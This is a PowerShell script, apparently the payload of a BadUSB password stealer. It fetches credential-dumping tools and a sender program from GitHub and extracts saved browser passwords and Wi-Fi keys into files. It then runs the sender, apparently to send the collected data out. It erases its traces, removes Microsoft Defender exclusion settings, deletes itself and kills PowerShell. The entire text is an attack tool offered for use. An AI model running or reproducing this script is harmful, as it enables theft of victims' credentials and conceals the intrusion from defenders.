Set-Location C:\Users\Public\Documents
Invoke-WebRequest "https://github.com/kidarok/Simple_Password_Stealer_BadUSB/blob/main/WebBrowserPassView.exe?raw=true" -OutFile WebBrowserPassView.exe
Invoke-WebRequest "https://github.com/sixsevenmeisterohiorizz/sender.py/raw/main/sender.exe?raw=true" -OutFile sender.exe
Invoke-WebRequest "https://github.com/kidarok/Simple_Password_Stealer_BadUSB/blob/main/WirelessKeyView.exe?raw=true" -OutFile WirelessKeyView.exe
.\WebBrowserPassView.exe /stext f.txt
Start-Sleep 3
.\WirelessKeyView.exe /stext f2.txt
Start-Sleep 3
Get-Content -Path f.txt, f2.txt > data.txt
.\sender.exe
Start-Sleep 5
Remove-Item .\data.txt
Remove-Item .\f.txt
Remove-Item .\f2.txt
Remove-Item .\WebBrowserPassView.exe
Remove-Item .\sender.exe
Remove-Item .\WirelessKeyView.exe
Remove-MpPreference -ExclusionPath C:\Users\Public\Documents\ -Force
Remove-MpPreference -ExclusionExtension .ps1 -Force
Remove-Item .\main.ps1
Remove-Item -Path $MyInvocation.MyCommand.Path -Force
taskkill -F /IM powershell.exe
exit
